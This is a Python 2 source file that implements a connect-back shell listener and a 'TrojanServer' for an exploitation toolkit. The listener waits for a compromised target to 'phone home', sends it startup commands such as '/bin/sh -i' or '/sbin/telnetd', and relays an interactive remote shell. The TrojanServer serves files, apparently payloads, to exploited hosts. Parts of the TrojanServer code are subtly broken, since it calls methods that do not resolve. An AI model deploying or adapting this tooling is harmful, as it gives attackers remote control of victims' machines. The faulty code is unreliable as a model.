import signal
import socket
import sys
import os
import select
import traceback
import errno

class ConnectbackServer(object):
    """
    A connect-back server class.
    
    This class provides a server that waits for an incoming connection from a
    connect-back payload and provides an interactive shell.  Think "netcat
    listener" that has an API and can be used programmatically.
    """
    MAX_READ=1024
    def __init__(self,connectback_host,startcmd=None,connectback_shell=True):
        """
        Class constructor.
        
        Parameters
        ----------
        callback_ip: the address this server should bind to.
        port: Optional. The port this server should bind to.  Default value is
            8080.
        startcmd: Optional.  A command string to issue to the remote host upon
            connecting.  This could be a command to restart the exploited
            service, or to customize the interactive shell, e.g., '/bin/sh -i'.
        connectback_shell: Optional.  This argument defaults to True, which is
            99% of the time is what you need.  See note.
        
        Note
        ----
        If, say, you wanted to non-interactively exploit a target (or multiple
        targets) and automatically kick off a telnet sever on each one, then,
        for each exploited target, you could construct a ConnectbackServer like
        so:
            server=ConnectbackServer(connectback_host,startcmd='/sbin/telnetd',connectback_shell=False)
        """
        self.pid=None
        self.callback_ip=connectback_host.callback_ip
        self.port=connectback_host.port
        self.startcmd=startcmd
        self.connectback_shell=connectback_shell

    def __handler(self,signum,frame):
        #print >>sys.stderr,"signal num %d\n"%signum
        self.keepgoing=False

    def __server(self):
        serversocket = socket.socket(
                socket.AF_INET,socket.SOCK_STREAM)
        serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        serversocket.bind((self.callback_ip,int(self.port)))
        serversocket.listen(5)
        return serversocket
        
    def __exit(self):
        #this prevents a hang in mod_wsgi, which traps sys.exit()
        os.execv("/bin/true",["/bin/true"])

    def __serve_connectback_shell(self):
        max_read=self.__class__.MAX_READ
        signal.signal(signal.SIGINT,self.__handler)
        signal.signal(signal.SIGTERM,self.__handler)
        server_socket=self.__server()
        print >>sys.stderr,"Listening on port %d\n" % int(self.port)
        print >>sys.stderr,"Waiting for incoming connection.\n"
        self.keepgoing=True
        
        try:
            (clientsocket,addess) = server_socket.accept()
        except Exception as e:
            server_socket.shutdown(socket.SHUT_RDWR)
            server_socket.close()
            return

        print "Target has phoned home.\n"
        fd_to_file={clientsocket.fileno:clientsocket,sys.stdin.fileno():sys.stdin}
        inputlist=[clientsocket,sys.stdin]
        
        
        if None != self.startcmd:
            clientsocket.send(self.startcmd+"\n")
        #clientsocket.send("exec /bin/sh -i\n")
        
        if self.connectback_shell:
            self.keepgoing=True
        else:
            self.keepgoing=False
                
        while self.keepgoing==True:
            try:
                inp,outp,excep=select.select(inputlist,[],[])
                for f in inp:
                    if f is clientsocket:
                        data=f.recv(max_read)
                        if data:
                            sys.stdout.write(data)
                            sys.stdout.flush()
                    else:
                        data=sys.stdin.readline()
                        if data:
                            clientsocket.send(data)

            except Exception as e:
                #print traceback.format_exc()
                #print >>sys.stderr,str(e)
                self.keepgoing=False
                print >>sys.stderr,""
                print >>sys.stderr,"Closing connection.\n"
                clientsocket.shutdown(socket.SHUT_RDWR)
                clientsocket.close()
                server_socket.shutdown(socket.SHUT_RDWR)
                server_socket.close()

        print >>sys.stderr,"Exiting\n"
        self.__exit()
        
    def wait(self):
        signal.signal(signal.SIGINT,self.__handler)
        keep_waiting=True
        while keep_waiting:
            try:
                status=os.waitpid(self.pid,0)
                keep_waiting=False
            except OSError as ose:
                if not ose.errno == errno.EINTR:
                    keep_waiting = False
                    
        signal.signal(signal.SIGINT,signal.SIG_DFL)
        self.pid=None
        return status[1]
        
    def serve_connectback(self):
        """
        Serve connect-back shell.
        
        This function forks and returns the child PID.  The child exits without
        returning.
        
        If connectback_shell is False and startcmd is None, this function
        returns None immediately without forking.
        
        """
        
        if self.connectback_shell or self.startcmd:
            if self.pid:
                raise Exception("There is an existing child process. Pid: %d" %self.pid)
            self.pid=os.fork()
            if self.pid and self.pid > 0:
                return self.pid
            else:
                #no return
                self.__serve_connectback_shell()
        else:
            return None
   

class TrojanServer(ConnectbackServer):
    def __init__(self,connectback_host,files_to_serve,startcmd=None,connectback_shell=False):
        super(self.__class__,self).__init__(connectback_host,startcmd=startcmd,connectback_shell=connectback_shell)
        self.files_to_serve=files_to_serve
        self.connectback_shell=connectback_shell
        
   
    def serve_file_to_client(self,filename,serversocket):
        data=open(filename,"r").read();
        (clientsocket,address) = serversocket.accept()
        clientsocket.send(data)
        
        clientsocket.shutdown(socket.SHUT_RDWR)
        clientsocket.close()
    

    def serve_connectback(self):
        pid=os.fork()
        if 0!= pid:
            return pid

        serversocket=self.server(self.port)
        for _file in self.files_to_serve:
            print "Waiting to send file: %s\n" % _file
            self.serve_file_to_client(_file,serversocket)
            print "\nDone with file: %s\n"%_file
        
        serversocket.shutdown(socket.SHUT_RDWR)
        serversocket.close()
        
        if self.connectback_shell == True:
            print "Serving callback_shell."
            #no return
            self.__serve_connectback_shell()

            


